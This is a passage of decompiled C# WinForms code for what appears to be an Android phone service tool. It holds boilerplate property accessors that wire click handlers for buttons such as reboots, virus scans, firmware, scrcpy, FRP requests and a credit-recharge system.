		internal virtual Button btnRebootRecovery
		{
			[CompilerGenerated]
			get
			{
				return this._btnRebootRecovery;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnRebootRecovery_Click);
				Button btnRebootRecovery = this._btnRebootRecovery;
				if (btnRebootRecovery != null)
				{
					btnRebootRecovery.Click -= value2;
				}
				this._btnRebootRecovery = value;
				btnRebootRecovery = this._btnRebootRecovery;
				if (btnRebootRecovery != null)
				{
					btnRebootRecovery.Click += value2;
				}
			}
		}

		// Token: 0x17000050 RID: 80
		// (get) Token: 0x060001D9 RID: 473 RVA: 0x00016537 File Offset: 0x00014737
		// (set) Token: 0x060001DA RID: 474 RVA: 0x00016544 File Offset: 0x00014744
		internal virtual Button btnCheckVirusOffline
		{
			[CompilerGenerated]
			get
			{
				return this._btnCheckVirusOffline;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnCheckVirusOffline_Click);
				Button btnCheckVirusOffline = this._btnCheckVirusOffline;
				if (btnCheckVirusOffline != null)
				{
					btnCheckVirusOffline.Click -= value2;
				}
				this._btnCheckVirusOffline = value;
				btnCheckVirusOffline = this._btnCheckVirusOffline;
				if (btnCheckVirusOffline != null)
				{
					btnCheckVirusOffline.Click += value2;
				}
			}
		}

		// Token: 0x17000051 RID: 81
		// (get) Token: 0x060001DB RID: 475 RVA: 0x00016587 File Offset: 0x00014787
		// (set) Token: 0x060001DC RID: 476 RVA: 0x00016594 File Offset: 0x00014794
		internal virtual Button btnReadHuaweiInfo
		{
			[CompilerGenerated]
			get
			{
				return this._btnReadHuaweiInfo;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnReadHuaweiInfo_Click);
				Button btnReadHuaweiInfo = this._btnReadHuaweiInfo;
				if (btnReadHuaweiInfo != null)
				{
					btnReadHuaweiInfo.Click -= value2;
				}
				this._btnReadHuaweiInfo = value;
				btnReadHuaweiInfo = this._btnReadHuaweiInfo;
				if (btnReadHuaweiInfo != null)
				{
					btnReadHuaweiInfo.Click += value2;
				}
			}
		}

		// Token: 0x17000052 RID: 82
		// (get) Token: 0x060001DD RID: 477 RVA: 0x000165D7 File Offset: 0x000147D7
		// (set) Token: 0x060001DE RID: 478 RVA: 0x000165E4 File Offset: 0x000147E4
		internal virtual Button btnRebootDeviceBootloader
		{
			[CompilerGenerated]
			get
			{
				return this._btnRebootDeviceBootloader;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnRebootDeviceBL_Click);
				Button btnRebootDeviceBootloader = this._btnRebootDeviceBootloader;
				if (btnRebootDeviceBootloader != null)
				{
					btnRebootDeviceBootloader.Click -= value2;
				}
				this._btnRebootDeviceBootloader = value;
				btnRebootDeviceBootloader = this._btnRebootDeviceBootloader;
				if (btnRebootDeviceBootloader != null)
				{
					btnRebootDeviceBootloader.Click += value2;
				}
			}
		}

		// Token: 0x17000053 RID: 83
		// (get) Token: 0x060001DF RID: 479 RVA: 0x00016627 File Offset: 0x00014827
		// (set) Token: 0x060001E0 RID: 480 RVA: 0x00016634 File Offset: 0x00014834
		internal virtual Button btnCleanVirusOffline
		{
			[CompilerGenerated]
			get
			{
				return this._btnCleanVirusOffline;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnCleanVirusOffline_Click);
				Button btnCleanVirusOffline = this._btnCleanVirusOffline;
				if (btnCleanVirusOffline != null)
				{
					btnCleanVirusOffline.Click -= value2;
				}
				this._btnCleanVirusOffline = value;
				btnCleanVirusOffline = this._btnCleanVirusOffline;
				if (btnCleanVirusOffline != null)
				{
					btnCleanVirusOffline.Click += value2;
				}
			}
		}

		// Token: 0x17000054 RID: 84
		// (get) Token: 0x060001E1 RID: 481 RVA: 0x00016677 File Offset: 0x00014877
		// (set) Token: 0x060001E2 RID: 482 RVA: 0x00016684 File Offset: 0x00014884
		internal virtual Button btnAbrirFirmwareSamsung
		{
			[CompilerGenerated]
			get
			{
				return this._btnAbrirFirmwareSamsung;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnAbrirFirmwareSamsung_Click);
				Button btnAbrirFirmwareSamsung = this._btnAbrirFirmwareSamsung;
				if (btnAbrirFirmwareSamsung != null)
				{
					btnAbrirFirmwareSamsung.Click -= value2;
				}
				this._btnAbrirFirmwareSamsung = value;
				btnAbrirFirmwareSamsung = this._btnAbrirFirmwareSamsung;
				if (btnAbrirFirmwareSamsung != null)
				{
					btnAbrirFirmwareSamsung.Click += value2;
				}
			}
		}

		// Token: 0x17000055 RID: 85
		// (get) Token: 0x060001E3 RID: 483 RVA: 0x000166C7 File Offset: 0x000148C7
		// (set) Token: 0x060001E4 RID: 484 RVA: 0x000166D4 File Offset: 0x000148D4
		internal virtual Button btnReadDwlSm
		{
			[CompilerGenerated]
			get
			{
				return this._btnReadDwlSm;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnReadDwlSm_Click);
				Button btnReadDwlSm = this._btnReadDwlSm;
				if (btnReadDwlSm != null)
				{
					btnReadDwlSm.Click -= value2;
				}
				this._btnReadDwlSm = value;
				btnReadDwlSm = this._btnReadDwlSm;
				if (btnReadDwlSm != null)
				{
					btnReadDwlSm.Click += value2;
				}
			}
		}

		// Token: 0x17000056 RID: 86
		// (get) Token: 0x060001E5 RID: 485 RVA: 0x00016717 File Offset: 0x00014917
		// (set) Token: 0x060001E6 RID: 486 RVA: 0x00016724 File Offset: 0x00014924
		internal virtual Button btnStartScrcpy
		{
			[CompilerGenerated]
			get
			{
				return this._btnStartScrcpy;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnStartScrcpy_Click);
				Button btnStartScrcpy = this._btnStartScrcpy;
				if (btnStartScrcpy != null)
				{
					btnStartScrcpy.Click -= value2;
				}
				this._btnStartScrcpy = value;
				btnStartScrcpy = this._btnStartScrcpy;
				if (btnStartScrcpy != null)
				{
					btnStartScrcpy.Click += value2;
				}
			}
		}

		// Token: 0x17000057 RID: 87
		// (get) Token: 0x060001E7 RID: 487 RVA: 0x00016767 File Offset: 0x00014967
		// (set) Token: 0x060001E8 RID: 488 RVA: 0x00016774 File Offset: 0x00014974
		internal virtual Button btnPushScrcpyServer
		{
			[CompilerGenerated]
			get
			{
				return this._btnPushScrcpyServer;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnPushScrcpyServer_Click);
				Button btnPushScrcpyServer = this._btnPushScrcpyServer;
				if (btnPushScrcpyServer != null)
				{
					btnPushScrcpyServer.Click -= value2;
				}
				this._btnPushScrcpyServer = value;
				btnPushScrcpyServer = this._btnPushScrcpyServer;
				if (btnPushScrcpyServer != null)
				{
					btnPushScrcpyServer.Click += value2;
				}
			}
		}

		// Token: 0x17000058 RID: 88
		// (get) Token: 0x060001E9 RID: 489 RVA: 0x000167B7 File Offset: 0x000149B7
		// (set) Token: 0x060001EA RID: 490 RVA: 0x000167C4 File Offset: 0x000149C4
		internal virtual Button btnRunScrcpyServer
		{
			[CompilerGenerated]
			get
			{
				return this._btnRunScrcpyServer;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnRunScrcpyServer_Click);
				Button btnRunScrcpyServer = this._btnRunScrcpyServer;
				if (btnRunScrcpyServer != null)
				{
					btnRunScrcpyServer.Click -= value2;
				}
				this._btnRunScrcpyServer = value;
				btnRunScrcpyServer = this._btnRunScrcpyServer;
				if (btnRunScrcpyServer != null)
				{
					btnRunScrcpyServer.Click += value2;
				}
			}
		}

		// Token: 0x17000059 RID: 89
		// (get) Token: 0x060001EB RID: 491 RVA: 0x00016807 File Offset: 0x00014A07
		// (set) Token: 0x060001EC RID: 492 RVA: 0x00016814 File Offset: 0x00014A14
		internal virtual Button btnTurnOffDisplay
		{
			[CompilerGenerated]
			get
			{
				return this._btnTurnOffDisplay;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnTurnOffDisplay_Click);
				Button btnTurnOffDisplay = this._btnTurnOffDisplay;
				if (btnTurnOffDisplay != null)
				{
					btnTurnOffDisplay.Click -= value2;
				}
				this._btnTurnOffDisplay = value;
				btnTurnOffDisplay = this._btnTurnOffDisplay;
				if (btnTurnOffDisplay != null)
				{
					btnTurnOffDisplay.Click += value2;
				}
			}
		}

		// Token: 0x1700005A RID: 90
		// (get) Token: 0x060001ED RID: 493 RVA: 0x00016857 File Offset: 0x00014A57
		// (set) Token: 0x060001EE RID: 494 RVA: 0x00016864 File Offset: 0x00014A64
		internal virtual Button btnTurnOffWifi
		{
			[CompilerGenerated]
			get
			{
				return this._btnTurnOffWifi;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnTurnOffWifi_Click);
				Button btnTurnOffWifi = this._btnTurnOffWifi;
				if (btnTurnOffWifi != null)
				{
					btnTurnOffWifi.Click -= value2;
				}
				this._btnTurnOffWifi = value;
				btnTurnOffWifi = this._btnTurnOffWifi;
				if (btnTurnOffWifi != null)
				{
					btnTurnOffWifi.Click += value2;
				}
			}
		}

		// Token: 0x1700005B RID: 91
		// (get) Token: 0x060001EF RID: 495 RVA: 0x000168A7 File Offset: 0x00014AA7
		// (set) Token: 0x060001F0 RID: 496 RVA: 0x000168B4 File Offset: 0x00014AB4
		internal virtual Button btnComandosShizuku
		{
			[CompilerGenerated]
			get
			{
				return this._btnComandosShizuku;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnComandosShizuku_Click);
				Button btnComandosShizuku = this._btnComandosShizuku;
				if (btnComandosShizuku != null)
				{
					btnComandosShizuku.Click -= value2;
				}
				this._btnComandosShizuku = value;
				btnComandosShizuku = this._btnComandosShizuku;
				if (btnComandosShizuku != null)
				{
					btnComandosShizuku.Click += value2;
				}
			}
		}

		// Token: 0x1700005C RID: 92
		// (get) Token: 0x060001F1 RID: 497 RVA: 0x000168F7 File Offset: 0x00014AF7
		// (set) Token: 0x060001F2 RID: 498 RVA: 0x00016901 File Offset: 0x00014B01
		internal virtual Label UserE { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700005D RID: 93
		// (get) Token: 0x060001F3 RID: 499 RVA: 0x0001690A File Offset: 0x00014B0A
		// (set) Token: 0x060001F4 RID: 500 RVA: 0x00016914 File Offset: 0x00014B14
		internal virtual Button btnCleanMotoApps2024
		{
			[CompilerGenerated]
			get
			{
				return this._btnCleanMotoApps2024;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnCleanMotoApps2024_Click);
				Button btnCleanMotoApps = this._btnCleanMotoApps2024;
				if (btnCleanMotoApps != null)
				{
					btnCleanMotoApps.Click -= value2;
				}
				this._btnCleanMotoApps2024 = value;
				btnCleanMotoApps = this._btnCleanMotoApps2024;
				if (btnCleanMotoApps != null)
				{
					btnCleanMotoApps.Click += value2;
				}
			}
		}

		// Token: 0x1700005E RID: 94
		// (get) Token: 0x060001F5 RID: 501 RVA: 0x00016957 File Offset: 0x00014B57
		// (set) Token: 0x060001F6 RID: 502 RVA: 0x00016964 File Offset: 0x00014B64
		internal virtual Button btnSolicitarFRPIMEI
		{
			[CompilerGenerated]
			get
			{
				return this._btnSolicitarFRPIMEI;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnSolicitarFRPIMEI_Click);
				Button btnSolicitarFRPIMEI = this._btnSolicitarFRPIMEI;
				if (btnSolicitarFRPIMEI != null)
				{
					btnSolicitarFRPIMEI.Click -= value2;
				}
				this._btnSolicitarFRPIMEI = value;
				btnSolicitarFRPIMEI = this._btnSolicitarFRPIMEI;
				if (btnSolicitarFRPIMEI != null)
				{
					btnSolicitarFRPIMEI.Click += value2;
				}
			}
		}

		// Token: 0x1700005F RID: 95
		// (get) Token: 0x060001F7 RID: 503 RVA: 0x000169A7 File Offset: 0x00014BA7
		// (set) Token: 0x060001F8 RID: 504 RVA: 0x000169B1 File Offset: 0x00014BB1
		internal virtual DataGridView dgvTickets { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000060 RID: 96
		// (get) Token: 0x060001F9 RID: 505 RVA: 0x000169BA File Offset: 0x00014BBA
		// (set) Token: 0x060001FA RID: 506 RVA: 0x000169C4 File Offset: 0x00014BC4
		internal virtual Label lblCreditosActuales { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000061 RID: 97
		// (get) Token: 0x060001FB RID: 507 RVA: 0x000169CD File Offset: 0x00014BCD
		// (set) Token: 0x060001FC RID: 508 RVA: 0x000169D7 File Offset: 0x00014BD7
		internal virtual GroupBox grpRecargas { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000062 RID: 98
		// (get) Token: 0x060001FD RID: 509 RVA: 0x000169E0 File Offset: 0x00014BE0
		// (set) Token: 0x060001FE RID: 510 RVA: 0x000169EC File Offset: 0x00014BEC
		internal virtual Button btnRecarga100
		{
			[CompilerGenerated]
			get
			{
				return this._btnRecarga100;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnRecarga100_Click);
				Button btnRecarga = this._btnRecarga100;
				if (btnRecarga != null)
				{
					btnRecarga.Click -= value2;
				}
				this._btnRecarga100 = value;
				btnRecarga = this._btnRecarga100;
				if (btnRecarga != null)
				{
					btnRecarga.Click += value2;
				}
			}
		}

		// Token: 0x17000063 RID: 99
		// (get) Token: 0x060001FF RID: 511 RVA: 0x00016A2F File Offset: 0x00014C2F
		// (set) Token: 0x06000200 RID: 512 RVA: 0x00016A39 File Offset: 0x00014C39
		internal virtual Button btnRecarga500 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000064 RID: 100
		// (get) Token: 0x06000201 RID: 513 RVA: 0x00016A42 File Offset: 0x00014C42
		// (set) Token: 0x06000202 RID: 514 RVA: 0x00016A4C File Offset: 0x00014C4C
		internal virtual Button btnRecarga200
		{
			[CompilerGenerated]
			get
			{
				return this._btnRecarga200;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnRecarga200_Click);
				Button btnRecarga = this._btnRecarga200;
				if (btnRecarga != null)
				{
					btnRecarga.Click -= value2;
				}
				this._btnRecarga200 = value;
				btnRecarga = this._btnRecarga200;
				if (btnRecarga != null)
				{
					btnRecarga.Click += value2;
				}
			}
		}

		// Token: 0x17000065 RID: 101
		// (get) Token: 0x06000203 RID: 515 RVA: 0x00016A8F File Offset: 0x00014C8F
		// (set) Token: 0x06000204 RID: 516 RVA: 0x00016A99 File Offset: 0x00014C99
		internal virtual Label lb100creditos { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000066 RID: 102
		// (get) Token: 0x06000205 RID: 517 RVA: 0x00016AA2 File Offset: 0x00014CA2
		// (set) Token: 0x06000206 RID: 518 RVA: 0x00016AAC File Offset: 0x00014CAC
		internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000067 RID: 103
		// (get) Token: 0x06000207 RID: 519 RVA: 0x00016AB5 File Offset: 0x00014CB5
		// (set) Token: 0x06000208 RID: 520 RVA: 0x00016ABF File Offset: 0x00014CBF
		internal virtual Label Label4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000068 RID: 104
		// (get) Token: 0x06000209 RID: 521 RVA: 0x00016AC8 File Offset: 0x00014CC8
		// (set) Token: 0x0600020A RID: 522 RVA: 0x00016AD2 File Offset: 0x00014CD2
		internal virtual DataGridView dgvRecargas { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000069 RID: 105
		// (get) Token: 0x0600020B RID: 523 RVA: 0x00016ADB File Offset: 0x00014CDB
		// (set) Token: 0x0600020C RID: 524 RVA: 0x00016AE8 File Offset: 0x00014CE8
		internal virtual Button btnVerHistorialRecargas
		{
			[CompilerGenerated]
			get
			{
				return this._btnVerHistorialRecargas;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnVerHistorialRecargas_Click);
				Button btnVerHistorialRecargas = this._btnVerHistorialRecargas;
				if (btnVerHistorialRecargas != null)
				{
					btnVerHistorialRecargas.Click -= value2;
				}
				this._btnVerHistorialRecargas = value;
				btnVerHistorialRecargas = this._btnVerHistorialRecargas;
				if (btnVerHistorialRecargas != null)
				{
					btnVerHistorialRecargas.Click += value2;
				}
			}
		}

		// Token: 0x1700006A RID: 106
		// (get) Token: 0x0600020D RID: 525 RVA: 0x00016B2B File Offset: 0x00014D2B
		// (set) Token: 0x0600020E RID: 526 RVA: 0x00016B35 File Offset: 0x00014D35
		internal virtual TabControl TicketsyCred { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700006B RID: 107
		// (get) Token: 0x0600020F RID: 527 RVA: 0x00016B3E File Offset: 0x00014D3E
		// (set) Token: 0x06000210 RID: 528 RVA: 0x00016B48 File Offset: 0x00014D48
		internal virtual TabPage Tickets { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700006C RID: 108
		// (get) Token: 0x06000211 RID: 529 RVA: 0x00016B51 File Offset: 0x00014D51
		// (set) Token: 0x06000212 RID: 530 RVA: 0x00016B5B File Offset: 0x00014D5B
		internal virtual TabPage HistorialRecargas { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700006D RID: 109
		// (get) Token: 0x06000213 RID: 531 RVA: 0x00016B64 File Offset: 0x00014D64
		// (set) Token: 0x06000214 RID: 532 RVA: 0x00016B70 File Offset: 0x00014D70
		internal virtual Button btnVerTickets
		{
			[CompilerGenerated]
			get
			{
				return this._btnVerTickets;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnVerTickets_Click);
				Button btnVerTickets = this._btnVerTickets;
				if (btnVerTickets != null)
				{
					btnVerTickets.Click -= value2;
				}
				this._btnVerTickets = value;
				btnVerTickets = this._btnVerTickets;
				if (btnVerTickets != null)
				{
					btnVerTickets.Click += value2;
				}
			}
		}

		// Token: 0x1700006E RID: 110
		// (get) Token: 0x06000215 RID: 533 RVA: 0x00016BB3 File Offset: 0x00014DB3
		// (set) Token: 0x06000216 RID: 534 RVA: 0x00016BC0 File Offset: 0x00014DC0
		internal virtual Button btnGestionarCreditos
		{
			[CompilerGenerated]
			get
			{
				return this._btnGestionarCreditos;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnGestionarCreditos_Click);
				Button btnGestionarCreditos = this._btnGestionarCreditos;
				if (btnGestionarCreditos != null)
				{
					btnGestionarCreditos.Click -= value2;
				}
				this._btnGestionarCreditos = value;
				btnGestionarCreditos = this._btnGestionarCreditos;
				if (btnGestionarCreditos != null)
				{
					btnGestionarCreditos.Click += value2;
				}
			}
		}

		// Token: 0x1700006F RID: 111
		// (get) Token: 0x06000217 RID: 535 RVA: 0x00016C03 File Offset: 0x00014E03
		// (set) Token: 0x06000218 RID: 536 RVA: 0x00016C10 File Offset: 0x00014E10
		internal virtual Button btnOpenAdbAdmin
		{
			[CompilerGenerated]
			get
			{
				return this._btnOpenAdbAdmin;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnAbrirGestorApps_Click);
				Button btnOpenAdbAdmin = this._btnOpenAdbAdmin;
				if (btnOpenAdbAdmin != null)
				{
					btnOpenAdbAdmin.Click -= value2;
				}
				this._btnOpenAdbAdmin = value;
				btnOpenAdbAdmin = this._btnOpenAdbAdmin;
				if (btnOpenAdbAdmin != null)
				{
					btnOpenAdbAdmin.Click += value2;
				}
			}
		}

		// Token: 0x17000070 RID: 112
		// (get) Token: 0x06000219 RID: 537 RVA: 0x00016C53 File Offset: 0x00014E53
		// (set) Token: 0x0600021A RID: 538 RVA: 0x00016C60 File Offset: 0x00014E60
		internal virtual Button btnConsultarYEliminarVirusOnline
		{
			[CompilerGenerated]
			get
			{
				return this._btnConsultarYEliminarVirusOnline;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnConsultarYEliminarVirusOnline_Click);
				Button btnConsultarYEliminarVirusOnline = this._btnConsultarYEliminarVirusOnline;
				if (btnConsultarYEliminarVirusOnline != null)
				{
					btnConsultarYEliminarVirusOnline.Click -= value2;
				}
				this._btnConsultarYEliminarVirusOnline = value;
				btnConsultarYEliminarVirusOnline = this._btnConsultarYEliminarVirusOnline;
				if (btnConsultarYEliminarVirusOnline != null)
				{
					btnConsultarYEliminarVirusOnline.Click += value2;
				}
			}
		}

		// Token: 0x17000071 RID: 113
		// (get) Token: 0x0600021B RID: 539 RVA: 0x00016CA3 File Offset: 0x00014EA3
		// (set) Token: 0x0600021C RID: 540 RVA: 0x00016CB0 File Offset: 0x00014EB0
		internal virtual Button btnConsultarKoodousPorHash
		{
			[CompilerGenerated]
			get
			{
				return this._btnConsultarKoodousPorHash;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnConsultarKoodousPorHash_Click);
				Button btnConsultarKoodousPorHash = this._btnConsultarKoodousPorHash;
				if (btnConsultarKoodousPorHash != null)
				{
					btnConsultarKoodousPorHash.Click -= value2;
				}
				this._btnConsultarKoodousPorHash = value;
				btnConsultarKoodousPorHash = this._btnConsultarKoodousPorHash;
				if (btnConsultarKoodousPorHash != null)
				{
					btnConsultarKoodousPorHash.Click += value2;
				}
			}
		}

		// Token: 0x17000072 RID: 114
		// (get) Token: 0x0600021D RID: 541 RVA: 0x00016CF3 File Offset: 0x00014EF3
		// (set) Token: 0x0600021E RID: 542 RVA: 0x00016D00 File Offset: 0x00014F00
		internal virtual Button btnConsultarVirusOnlineSolo
		{
			[CompilerGenerated]
			get
			{
				return this._btnConsultarVirusOnlineSolo;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnConsultarVirusOnlineSolo_Click);
				Button btnConsultarVirusOnlineSolo = this._btnConsultarVirusOnlineSolo;
				if (btnConsultarVirusOnlineSolo != null)
				{
					btnConsultarVirusOnlineSolo.Click -= value2;
				}
				this._btnConsultarVirusOnlineSolo = value;
				btnConsultarVirusOnlineSolo = this._btnConsultarVirusOnlineSolo;
				if (btnConsultarVirusOnlineSolo != null)
				{
					btnConsultarVirusOnlineSolo.Click += value2;
				}
			}
		}

		// Token: 0x17000073 RID: 115
		// (get) Token: 0x0600021F RID: 543 RVA: 0x00016D43 File Offset: 0x00014F43
		// (set) Token: 0x06000220 RID: 544 RVA: 0x00016D4D File Offset: 0x00014F4D
		internal virtual RichTextBox txtOutput { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000074 RID: 116
		// (get) Token: 0x06000221 RID: 545 RVA: 0x00016D56 File Offset: 0x00014F56
		// (set) Token: 0x06000222 RID: 546 RVA: 0x00016D60 File Offset: 0x00014F60
		internal virtual CheckBox chkSoloDesactivar { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000075 RID: 117
		// (get) Token: 0x06000223 RID: 547 RVA: 0x00016D69 File Offset: 0x00014F69
		// (set) Token: 0x06000224 RID: 548 RVA: 0x00016D74 File Offset: 0x00014F74
		internal virtual Button btnRevisarKaspersky
		{
			[CompilerGenerated]
			get
			{
				return this._btnRevisarKaspersky;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnRevisarKaspersky_Click);
				Button btnRevisarKaspersky = this._btnRevisarKaspersky;
				if (btnRevisarKaspersky != null)
				{
					btnRevisarKaspersky.Click -= value2;
				}
				this._btnRevisarKaspersky = value;
				btnRevisarKaspersky = this._btnRevisarKaspersky;
				if (btnRevisarKaspersky != null)
				{
					btnRevisarKaspersky.Click += value2;
				}
			}
		}

		// Token: 0x17000076 RID: 118
		// (get) Token: 0x06000225 RID: 549 RVA: 0x00016DB7 File Offset: 0x00014FB7
		// (set) Token: 0x06000226 RID: 550 RVA: 0x00016DC1 File Offset: 0x00014FC1
		internal virtual Button btnDriversRk { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000077 RID: 119
		// (get) Token: 0x06000227 RID: 551 RVA: 0x00016DCA File Offset: 0x00014FCA
		// (set) Token: 0x06000228 RID: 552 RVA: 0x00016DD4 File Offset: 0x00014FD4
		internal virtual Button btnRkchip
		{
			[CompilerGenerated]
			get
			{
				return this._btnRkchip;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnRkchip_Click);
				Button btnRkchip = this._btnRkchip;
				if (btnRkchip != null)
				{
					btnRkchip.Click -= value2;
				}
				this._btnRkchip = value;
				btnRkchip = this._btnRkchip;
				if (btnRkchip != null)
				{
					btnRkchip.Click += value2;
				}
			}
		}

		// Token: 0x17000078 RID: 120
		// (get) Token: 0x06000229 RID: 553 RVA: 0x00016E17 File Offset: 0x00015017
		// (set) Token: 0x0600022A RID: 554 RVA: 0x00016E24 File Offset: 0x00015024
		internal virtual Button btndrivershonor
		{
			[CompilerGenerated]
			get
			{
				return this._btndrivershonor;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btndrivershonor_Click);
				Button btndrivershonor = this._btndrivershonor;
				if (btndrivershonor != null)
				{
					btndrivershonor.Click -= value2;
				}
				this._btndrivershonor = value;
				btndrivershonor = this._btndrivershonor;
				if (btndrivershonor != null)
				{
					btndrivershonor.Click += value2;
				}
			}
		}

		// Token: 0x17000079 RID: 121
		// (get) Token: 0x0600022B RID: 555 RVA: 0x00016E67 File Offset: 0x00015067
		// (set) Token: 0x0600022C RID: 556 RVA: 0x00016E71 File Offset: 0x00015071
		internal virtual SplitContainer SplitContainerLog { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700007A RID: 122
		// (get) Token: 0x0600022D RID: 557 RVA: 0x00016E7A File Offset: 0x0001507A
		// (set) Token: 0x0600022E RID: 558 RVA: 0x00016E84 File Offset: 0x00015084
		internal virtual Button btnSolicitarFRPv1
		{
			[CompilerGenerated]
			get
			{
				return this._btnSolicitarFRPv1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnSolicitarFRPv1_Click);
				Button btnSolicitarFRPv = this._btnSolicitarFRPv1;
				if (btnSolicitarFRPv != null)
				{
					btnSolicitarFRPv.Click -= value2;
				}
				this._btnSolicitarFRPv1 = value;
				btnSolicitarFRPv = this._btnSolicitarFRPv1;
				if (btnSolicitarFRPv != null)
				{
					btnSolicitarFRPv.Click += value2;
				}
			}
		}

		// Token: 0x1700007B RID: 123
		// (get) Token: 0x0600022F RID: 559 RVA: 0x00016EC7 File Offset: 0x000150C7
		// (set) Token: 0x06000230 RID: 560 RVA: 0x00016ED1 File Offset: 0x000150D1
		internal virtual FlowLayoutPanel FlowLayoutPanel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700007C RID: 124
		// (get) Token: 0x06000231 RID: 561 RVA: 0x00016EDA File Offset: 0x000150DA
		// (set) Token: 0x06000232 RID: 562 RVA: 0x00016EE4 File Offset: 0x000150E4
		internal virtual FlowLayoutPanel FlowLayoutPanel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700007D RID: 125
		// (get) Token: 0x06000233 RID: 563 RVA: 0x00016EED File Offset: 0x000150ED
		// (set) Token: 0x06000234 RID: 564 RVA: 0x00016EF7 File Offset: 0x000150F7
		internal virtual FlowLayoutPanel FlowLayoutPanel3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700007E RID: 126
		// (get) Token: 0x06000235 RID: 565 RVA: 0x00016F00 File Offset: 0x00015100
		// (set) Token: 0x06000236 RID: 566 RVA: 0x00016F0C File Offset: 0x0001510C
		internal virtual Button btnSolicitarLicenciaporWhats
		{
			[CompilerGenerated]
			get
			{
				return this._btnSolicitarLicenciaporWhats;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnSolicitarLicenciaporWhats_Click);
				Button btnSolicitarLicenciaporWhats = this._btnSolicitarLicenciaporWhats;
				if (btnSolicitarLicenciaporWhats != null)
				{
